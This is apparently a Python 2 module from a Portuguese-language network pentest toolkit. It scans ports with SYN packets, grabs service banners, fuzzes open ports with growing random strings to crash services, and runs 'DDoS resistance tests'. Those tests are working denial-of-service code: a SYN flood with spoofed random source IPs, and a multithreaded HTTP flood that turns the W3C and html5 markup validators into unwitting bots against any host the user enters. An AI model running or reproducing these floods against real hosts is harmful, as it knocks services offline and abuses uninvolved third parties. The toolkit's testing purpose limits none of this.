#!/usr/bin/env python

'''
	#### For this module to work, you will need to:

	1 - Install Scapy 2.3.3 (with Arch)

	2 - If you are using Windows and get the "gen not defined error":
	- Go to the folder Python27\Lib\site-packages\scapy\arch\windows\
	- Put this on the beginning of the 'compatibility.py' file:

	from scapy.base_classes import Gen, SetGen
	import scapy.plist as plist
	from scapy.utils import PcapReader
	from scapy.data import MTU, ETH_P_ARP
	import os,re,sys,socket,time, itertools
	WINDOWS = True
	
	### This will avoid the ICMP function erros
'''

import gettext, logging, random, requests, subprocess, socket, ssl, string, sys, threading, time, urllib

from urlparse import urlparse
from datetime import datetime

# Utils functions
from utils import bcolors
from utils import buildResponse
from utils import clear
from utils import COMMON_PORTS
from utils import pause
from utils import printLine
from utils import userAgent

# Scapy Functions
from scapy.all import ICMP
from scapy.all import IP
from scapy.all import RandShort
from scapy.all import send
from scapy.all import sr1
from scapy.all import sr
from scapy.all import TCP

# Queue Functions
from Queue import Queue

##### DDOS functions #####
## HTTP Flood

'''
	Flood Loop using HTTP Markup Services as bots
'''
def floodWithMarkup(url):
	# Define global Total Packets Sent, Total Packets Received and the lock used to get access to these counters
	global totalPackets
	global totalResponse
	global responseLock

	# Try to send the packet and register the results in the counters
	try:
		# Make requests during the pre-established time
		while (time.time() < stopTime):
			# Use the lock to increase the total counter
			with responseLock:
				totalPackets += 1

			# Send the request using a random markup validation service (used as bot) and wait a little to avoid throwing exceptions
			req = urllib.request.urlopen(urllib.request.Request(url,headers={'User-Agent': random.choice(uAgent)}))
			time.sleep(.1)

			# Use the lock to increase the response counter (only happens if there is no exception in the last step)
			with responseLock:
				totalResponse += 1

	# In the case of a exception, wait and then return
	except:
		time.sleep(.1)


'''
	Flood Loop using GETs to alternate with the Markup Bots
'''
def floodWithGET(item):
	# Define global Total Packets Sent, Total Packets Received and the lock used to get access to these counters
	global totalPackets
	global totalResponse
	global responseLock

	# Define the Data Headers using a pre-estabilished file with the parameters
	headers = open("headersData.txt", "r")
	data = headers.read()
	headers.close()

	# Try to send the packet and register the results in the counters
	try:
		# Make requests during the pre-established time		
		while (time.time() < stopTime):
			# Use the lock to increase the total counter
			with responseLock:
				totalPackets += 1
			# Create a HTTP 1.1 GET packet defining the host to avoid problems and using a random agent to disguise as a valid request
			packet = str("GET / HTTP/1.1\nHost: "+hostDDoS+"\n\n User-Agent: "+random.choice(uAgent)+"\n"+data).encode('utf-8')
			
			# Create the socket and send the packet
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((hostDDoS,int(portDDoS)))
			s.sendto(packet, (hostDDoS, int(portDDoS)))

			# Close the connection and wait to avoid crashing
			s.shutdown(1)
			time.sleep(.1)

			# Use the lock to increase the response counter (only happens if there is no exception in the last step)
			with responseLock:
				totalResponse += 1
	except socket.error as e:
		# print("No connection! Server maybe down")
		#print("\033[91m",e,"\033[0m")
		time.sleep(.1)

'''
	Simulate a Simple Syn Flood attack
'''
def ddosAtkSyn(host,port):
	# Define the start time and the time to stop the tests
 	startTime = time.time()
	stopTime = startTime + 7 # seconds of test
	
	# Start this counter just to avoid undefined variables being used
	packetsSent = 0

	# Send SYN packets during the pre-established time while counting the number of packets sent
 	while (time.time() < stopTime):
		sendSYN(host,port)
		packetsSent += 1

	# Return the result
	return packetsSent

'''
	DDoS attack using http markup validation services
'''
def ddosAtkHttp(host,port):
	# Define global bot and user-agent lists
	global uAgent
	global bots
	bots = testBots()
	uAgent = userAgent()

	# Define global Host and Port values for the threads
	global hostDDoS
	global portDDoS
	hostDDoS = host
	portDDoS = port

	# Multi-thread shared number of packets sent/received and the lock used to obtain access to it
	global totalPackets
	global totalResponse
	global responseLock
	totalPackets = 0
	totalResponse = 0
	responseLock = threading.Lock()

	# Create 2 Tast Queues to manage the dos
	global firstQueue # Common queue
	global secondQueue # Http Markup queue
	firstQueue = Queue()
	secondQueue = Queue()

	# Define the global start time
	global startTime
	global stopTime
	firstRun = True

	# Define the number of threads that will be created
	thr = 130

	# Test the connection before starting the attack
	try:
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect((host,int(port)))
		s.settimeout(1)
	except socket.error as e:
		return (0,0,_('Erro ao conectar ao IP/Porta'))
	
	# Start the connection bomb using markup validation services and requests (to help)
	while True:
		# On the first loop the program save the start time and the total time of the tests
		if firstRun:
			startTime = time.time()
			stopTime = startTime + 7 # seconds of test
			firstRun = False

		# Multithread requests
		for i in range(thr):
			# Creates a thread to execute the 'Request' DoS attack
			t = threading.Thread(target=dos)
			# Killing a dos thread that is still alive (defining as daemon to differ from the main)
			t.daemon = True
			t.start()
			
			# Creates a thread to execute the 'Http Markup' DoS attack
			t2 = threading.Thread(target=doshttp)
			# Killing a doshttp thread that is still alive (defining as daemon to differ from the main)
			t2.daemon = True
			t2.start()
		
		# Managing the Tasks
		item = 0
		while (time.time() < stopTime):
			# Avoiding memory crash by imposing a simultaneos routine limit
			if (item > 1800):
				item = 0
				time.sleep(.1)
			item = item + 1
			firstQueue.put(item)
			secondQueue.put(item)

		# Waiting all requests to be done
		firstQueue.join()
		secondQueue.join()

		# Breaking the cycle when the time runs out
		if (time.time() > stopTime) :
			break
	
	# Return the results
	return (totalPackets,totalResponse,_('Teste realizado com sucesso'))

'''
	Dos used in other port cases and to assist the attacks
'''
def dos():
	# Use the previously defined stoptime
	global stopTime
	
	# Execute the queue during the pre-established time
	while (time.time() < stopTime):
		item = firstQueue.get()
		floodWithGET(item)
		firstQueue.task_done()
	
	# Execute the queue again to finish all items
	while not firstQueue.empty():
		item = firstQueue.get()
		floodWithGET(item)
		firstQueue.task_done()

'''
	Dos used in port 80 or 443 cases
'''
def doshttp():
	# Use the previously defined stoptime
	global stopTime
	
	# Execute the queue during the pre-established time
	while (time.time() < stopTime):
		item = secondQueue.get()
		floodWithMarkup(random.choice(bots)+"http://"+hostDDoS)
		secondQueue.task_done()
	
	# Execute the queue again to finish all items
	while not secondQueue.empty():
		item = secondQueue.get()
		floodWithMarkup(random.choice(bots)+"http://"+hostDDoS)
		secondQueue.task_done()

'''
	Scan a server for open ports using a stealth method with the SYN flag
'''
def portScanner(lang,server,ignoreFilter,portRange,scanCommon,showMsg):
	# If the showMsg flag is defined: clean the screen and print the header of the port information 
	if showMsg:
		clear()
		print _("Escaneando portas...")
		print bcolors.BOLD + _("Porta\t\tServico\t\t\tEstado") + bcolors.ENDC
		pass

	# Initialize the list with open ports
	openPortList = []

	# Check what time the scan started
	t1 = datetime.now()

	# TCP STEALTH
	# Similar to the TCP connect scan. This time we sends a TCP packet with the 
	# SYN flag set and the port number to connect to. If the port is open, the 
	# server responds with the SYN and ACK flags inside a TCP packet. 
	# But this time the client sends a RST flag in a TCP packet and not RST+ACK, 
	# which was the case in the TCP connect scan.
	
	# We also put in some error handling for catching errors

	# Do the scan and try to catch any error
	try:
		# Test for ports 1-1025
		for port in portRange:
			# Use Scapy to build and send the packet
			logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
			
			# Just define a random port as channel
			src_port = RandShort() 
			
			# Define the stealth scan using the SYN flag set
			stealth_scan_resp = sr1(IP(dst=server)/TCP(sport=src_port,dport=port,flags="S"),timeout=3, verbose=0)
			
			# If there is no response, the server problably uses a WAF on this port, so print the result
			if(str(type(stealth_scan_resp))=="<type 'NoneType'>"):
				if ((not ignoreFilter) and showMsg):
					print "{} \t\t".format(port) + ((COMMON_PORTS[port] + ("\t" if len(COMMON_PORTS[port])<8 else "")) if (port in COMMON_PORTS) else "-\t") + _("\t\tFiltrada")
			
			# Analyse the TCP layer (if there is one)
			elif(stealth_scan_resp.haslayer(TCP)):
				if(stealth_scan_resp.getlayer(TCP).flags == 0x12):
					# Stealth response
					send_rst = sr(IP(dst=server)/TCP(sport=src_port,dport=port,flags="R"),timeout=3, verbose=0)
					if showMsg:
						print "{} \t\t".format(port) + ((COMMON_PORTS[port] + ("\t" if len(COMMON_PORTS[port])<8 else "")) if (port in COMMON_PORTS) else "-\t") + _("\t\tAberta")
					openPortList.append(port)
				elif (stealth_scan_resp.getlayer(TCP).flags == 0x14):
					# Closed port
					pass

			# Analyse the ICMP layer (if there is one)
			elif(stealth_scan_resp.haslayer(ICMP)):
				if(int(stealth_scan_resp.getlayer(ICMP).type)==3 and int(stealth_scan_resp.getlayer(ICMP).code) in [1,2,3,9,10,13]):
					if ((not ignoreFilter) and showMsg):
						print "{} \t\t".format(port) + ((COMMON_PORTS[port] + ("\t" if len(COMMON_PORTS[port])<8 else "")) if (port in COMMON_PORTS) else "-\t") + _("\t\tFiltrada")

		# Test for common ports higher than 1025 (using the same method)
		if scanCommon:
			for port in {k for k, v in COMMON_PORTS.iteritems() if k >1025}:
				if port > 1025:
					# print port
					logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
					src_port = RandShort()
					
					stealth_scan_resp = sr1(IP(dst=server)/TCP(sport=src_port,dport=port,flags="S"),timeout=3, verbose=0)
					
					if(str(type(stealth_scan_resp))=="<type 'NoneType'>"):
						if ((not ignoreFilter) and showMsg):
							print "{} \t\t".format(port) + ((COMMON_PORTS[port] + ("\t" if len(COMMON_PORTS[port])<8 else "")) if (port in COMMON_PORTS) else "-\t") + _("\t\tFiltrada")

					elif(stealth_scan_resp.haslayer(TCP)):
						if(stealth_scan_resp.getlayer(TCP).flags == 0x12):
							# Stealth response
							send_rst = sr(IP(dst=server)/TCP(sport=src_port,dport=port,flags="R"),timeout=3, verbose=0)
							if showMsg:
								print "{} \t\t".format(port) + ((COMMON_PORTS[port] + ("\t" if len(COMMON_PORTS[port])<8 else "")) if (port in COMMON_PORTS) else "-\t") + _("\t\tAberta")
							openPortList.append(port)
						elif (stealth_scan_resp.getlayer(TCP).flags == 0x14):
							# Closed port : print "Port {}: \t".format(port) + ((COMMON_PORTS[port]) if (port in COMMON_PORTS) else "-") + "\tClosed"
							pass
					elif(stealth_scan_resp.haslayer(ICMP)):
						if(int(stealth_scan_resp.getlayer(ICMP).type)==3 and int(stealth_scan_resp.getlayer(ICMP).code) in [1,2,3,9,10,13]):
							if ((not ignoreFilter) and showMsg):
								print "{} \t\t".format(port) + ((COMMON_PORTS[port] + ("\t" if len(COMMON_PORTS[port])<8 else "")) if (port in COMMON_PORTS) else "-\t") + _("\t\tFiltrada")
	# In the case of a exception, exit
	except socket.error:
		print "Couldn't connect to server"
		sys.exit()

	# Checking the time again
	t2 = datetime.now()

	# Calculates the difference of time, to see how long it took to run the script
	total =  t2 - t1

	# Printing the information to screen
	print _('Tempo de scan: '), total
	return openPortList

'''
	Show the initial tests and then run all tests
'''
def netServDirect(lang):

	# Try to connect to the website
	url = raw_input(_("Endereco da interface para teste: "))
	parsed = urlparse(url)
	if len(parsed.netloc) == 0:
		parsed = urlparse('http://'+url)
		pass
	ipAddr = socket.gethostbyname(parsed.netloc)
	openPorts = []

	# Just to avoid GET erros
	url = url.replace("http://","")
	url = url.replace("https://","")
	try:
		# Do the request
		req = requests.get('http://'+url, stream=True)
		clear()
		print _("[!] Servidor esta online.")
	except (requests.ConnectionError, socket.error) as Exit:
		wait = raw_input(_('Nao foi possivel verificar pela porta 80'))
	
	# Remove the / end marker
	if url.endswith('/'):
		url = url[:-1]
		pass
	
	# Show the Url on the top of the page
	print url

	selection = raw_input(_('Digite as portas separando por virgula ou digite \'a\' para a busca automatica\n'))

	# Get the avaiable ports
	if selection == 'a':
		ignore = (raw_input(_('Digite \'i\' para nao mostrar as portas filtradas\n')) == 'i')
		openPorts = portScanner(lang,url,ignore,range(1,1025),True,True)
	else:
		clear()
		print bcolors.BOLD + _("Porta\t\tServico\t\t\tEstado") + bcolors.ENDC
		for port in selection.split(','):
			port = int(port)
			openPorts.append(port)
		openPorts = portScanner(lang,url,False,openPorts,False,True)	

	# [1] Testing Https use
	printLine()
	print bcolors.HEADER + '[1] ' + bcolors.ENDC + (_('Analise do servidor pelas portas [Banner Grabbing]'))
	testOpenPorts(lang,url,openPorts)

	# [2] Testing server resilience to DDOS Attacks
	printLine()
	print bcolors.HEADER + '[2] ' + bcolors.ENDC + (_('Teste de resistencia a DDOS'))
	testDDoS(lang,url,openPorts)

	# [3] Fuzzer testing
	printLine()
	print bcolors.HEADER + '[3] ' + bcolors.ENDC + (_('Teste de fuzz com strings montadas e strings aleatorias'))
	print testFuzz(lang,url, openPorts)

	# [4] Searching for open test ports | Already implemented, just an idea for improvement. IF you want to use, remove the '#' in the comments below
	# printLine()
	# print bcolors.HEADER + '[4] ' + bcolors.ENDC + (_('Verificando portas de teste abertas'))
	# print verifyOpenTestPorts(lang,url, openPorts if (selection == 'a') else portScanner(lang,url,True,range(1,1025),True,False))
	pause()


'''
	Get the server location and call testbuilder (netservdirect)
'''
def netServMenu(lang):
	# Import the clear function
	global clear
	
	# Change the software language (just a PoC to future implementation)
	import gettext
	global _
	if lang == 'pt':
		_ = lambda s: s
	else:
		lg = gettext.translation('netServ', localedir='locale', languages=[lang])
		lg.install()
		_ = lg.gettext
	
	# Basic definitions for the module menu
	menuOpts = {0:'0',1:'netServDirect'}

	# Network Services Menu
	subModule = {	'netServDirect':netServDirect, 		# Submodule of Web Interface tests
					}
	# Menu of the module
	while True:
		# Clean the screen
		clear()
		
		# Show the menu
		print(_('Net Services Pentest'))
		opt = int(raw_input(_("0 - Voltar para o Menu Principal\n1 - Verificar Servicos de Rede\n")))
		if opt == 0:
			return
		if opt in menuOpts:
			subModule[menuOpts[opt]](lang)
		else:
			clear()
			print _('Escolha invalida')

	# Main Menu and submodules definition
	print(_('Informacoes da rede:'))

'''
	Calculate the response time of the server
'''
def responseTimeTest(lang,url,port):

	# Try to estabilish the connection
	try:
		# Define the socket
		s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
		s.settimeout(3)

		# Checking the inital time
		t1 = datetime.now()

		# Connect to the service and then close the connection
		s.connect((url,port))
		s.close()

		# Checking the final time
		t2 = datetime.now()

		# Calculates the difference of time, to see how long it took to run the script
		return str(t2 - t1)

	# If there is any error, return the error
	except Exception as e:
		return str(e)

'''
	Send SYN packets(segments) to the target and ignoring the SYN+ACK's (using random IP and Port as source) to do a TCP Syn Flood
'''
def sendSYN(host,port):
	# Create an IP Packet using random ip as source and the target IP as destination
	ipPacket = IP()
	ipPacket.src = ".".join(map(str, (random.randint(0,255)for i in range(4))))
	ipPacket.dst = host

	# Create a TCP segment using a random source port and the target port as the destination
	tcpSegment = TCP()
	tcpSegment.sport = random.randint(1000,65535)
	tcpSegment.dport = port

	# Set the syn flag
	tcpSegment.flags = 'S'

	# Send the composition of the two (package/segment) and ignore the result
	send(ipPacket/tcpSegment, verbose=0) 
	pass

'''
	Define bot list to the ddos attack
'''
def testBots():
	# Start the list as empty
	bots=[]

	# Append each bot \ Using just 2 as a PoC
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("https://html5.validator.nu/?doc=")

	# bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	return bots

'''
	In the port list, do a DDOS attack and analyse the server deterioration on the time
'''
def testDDoS(lang,url,openPorts):
	print _('Iniciando ataque')

	# For each port, 	perform HTTP and Syn Flood attack, 
	# 					compare the number of packets sent/received 
	# 					and analyse the response time (before and after the floods)
	for port in openPorts:
		print '\n' + _('[+] Porta ') + str(port)

		print _('[|] Tempo de resposta inicial: ') + responseTimeTest(lang,url,port)
		# Perform an HTTP Flood attack using http markup validation services and print the number of packets sent/received
		print _('[|] HTTP Flood: Realizando DDoS... '),
		httpAtkResponse = ddosAtkHttp(url,port)
		print str(httpAtkResponse[0]) + _(' tentativas, ') + str(httpAtkResponse[1]) + ('({:.1%})'.format((float(httpAtkResponse[1])/float(httpAtkResponse[0]))) if (httpAtkResponse[0] != 0) else '') + _(' com sucesso. ') 
		print _('[|] - Tempo de resposta apos o flood: ') + responseTimeTest(lang,url,port)

		# Perform a SYN Flood basic attack and print the number of packets sent/received
		print _('[|] Syn Flood: Realizando DDoS... '),
		synAtkResponse = ddosAtkSyn(url,port)
		print str(synAtkResponse) + _(' pacotes/segmentos enviados')
		print _('[|] - Tempo de resposta apos o flood: ') + responseTimeTest(lang,url,port)

		# Print the response time before and after each ddos test

'''
	Perform a fuzzing test using random and constructed strings to crash the open services
'''
def testFuzz(lang,url,openPorts):
	# Define the time of the fuzzing tests
	secondsOfTest = 7

	# Define the crash flag
	crashFlag = False

	# Send a Fuzz test using common commands for each port depending on the service running
	for port in openPorts:
		commonCommand = raw_input(_('\n[+] Porta {}:\n[|] Insira o comando a ser testado: ').format(port))
		tempFlag = sendFuzz(url,port,commonCommand,"rn",secondsOfTest)
		crashFlag = (crashFlag or tempFlag)

	# Return the response
	return buildResponse(not crashFlag,_('\nNenhum servico comprometido'), _('\nUma das portas nao respondeu aos requests'))
'''
	Send a string depending on the service tested
'''
def sendFuzz(url,port,startString,endString,secondsOfTest):
	# Define the start time and the time to stop the tests
	startTime = time.time()
	stopTime = startTime + secondsOfTest # seconds of test

	# Define the maximum number of consecutive fails as 3
	failCount = 0

	# Create a test string using the start string and random letters to define a pattern
	randomString = ''.join(random.choice(string.uppercase) for i in range(50))
	testString = startString + randomString

	# Run the test during the pre-established time, increasing the string size on each successful connection
	while (time.time() < stopTime):
		# Try to catch a socket error to see if the server is down
		try:
			# Try to connect to the target before sending a string
			s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
			s.settimeout(1)
			s.connect((url,port))
			s.recv(1024)
	 	
			# DEBUG print "Sending buffer with length: "+str(len(testString+endString))
			
			# Send the string with the defined end pattern 
			s.send(testString + endString)
			s.close()
			time.sleep(.1)

			# Reset the fail count on each successful connection and increase the test string
			failCount = 0
			randomString = ''.join(random.choice(string.uppercase) for i in range(50))
			testString += randomString
		# If we fail to connect to the server, we assume its crashed and print the statement below
		except (requests.ConnectionError, socket.error) as e:
			failCount += 1
			if (failCount == 3):
				print _('Porta ') + str(port) + _(': 3 erros consecutivos com string de tamanho ') + str(len(testString+endString)-50) + _('\nExcecao: ') + str(e)
				return True
	print _('Porta ') + str(port) + _(': OK')
	return False
'''
	Receive a list of open ports and filter the banner grabbing possibilities
'''
def testOpenPorts(lang,url,openPorts):
	# Just starting the flag of problems detected and the msg to avoid using undefined variables
	problemDetect = False
	warningMsg = ""

	# Try to get information about each port
	print _('Obtendo informacoes dos servicos disponiveis')
	for port in openPorts:
		# Do a Banner Grabbing for all open ports with common vulnerabilities
		print "[+] Port {} [".format(port) + ((COMMON_PORTS[port]+']:' + ("\t" if len(COMMON_PORTS[port]+']')<7 else '\t')) if (port in COMMON_PORTS) else "-]\t") + "\t\tOpen"
		
		# If there is any unauthenticated protocol exposed, emits a Warning
		if (port == 23) | (port == 69): # Verify unencrypted and unauthenticated ports
			problemDetect = True
			warningMsg += '- \t' + COMMON_PORTS[port] + _(' - Porta [{}] Exposta\n').format(port)
		
		# Get the HTTP protocol Header if is possible
		elif port == 80: # HTTP
			try:
				# Do the request
				req = requests.options('http://'+url, stream=True)
				if 'Server' in req.headers:
					print " -  Servidor: " + req.headers['Server'] 
			except (requests.ConnectionError, socket.error) as e:
				wait = raw_input(_('Interface Offline ou URL Invalida'))
				continue
		elif port == 443: # HTTPS
			try:
				# Do the request
				req = requests.options('https://'+url, stream=True)
				if 'Server' in req.headers:
					print " -  Servidor: " + req.headers['Server'] 
			except (requests.ConnectionError, socket.error) as e:
				wait = raw_input(_('Interface Offline ou URL Invalida'))
				continue
		try:
			sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			sock.settimeout(1)
			# Use socket to connect with the server by a specific port
			if (port == 80):
				sock.connect((url, port))
				sock.send('GET / HTTP/1.1\r\nHost:www.cnn.com\r\n\r\n')
			elif (port == 443):
				sock = ssl.wrap_socket(sock, ssl_version=ssl.PROTOCOL_TLSv1)
				sock.connect((url, port))
				sock.send('GET / HTTP/1.0\r\n\r\n')
			else:
				sock.connect((url, port))
			data = sock.recv(1024)
			sock.close()
		except socket.error:
			continue

		# If there is a problem with the network services, it shows a warning msg
		if problemDetect:
			print bcolors.WARNING + warningMsg + bcolors.ENDC

'''
	Search an unknown service open that is open to test
'''
def verifyOpenTestPorts(lang,url,openPorts):
	# Start the list of Test Ports as empty and the found flag as False
	testPortFound = False

	# Search for non Commmon ports on the open port list
	for port in openPorts:
		if port not in COMMON_PORTS:
			testPortFound = True
			testPortList = port

	# If there is any non common port, build a warning message
	if testPortFound:
		# Show a warning if there is any test port open
		msg = _('Portas de teste abertas: ')
		for port in testPortList:
			msg += port + ', '	 
		# Return the response (if there is a problem) with all the problematic ports
		return buildResponse(False,_('\n'),msg)
	else:
		# Return that there is no problem
		return buildResponse(True,'Nao ha portas de teste abertas',_('\n'))

if __name__ == '__main__':
	netServMenu('pt')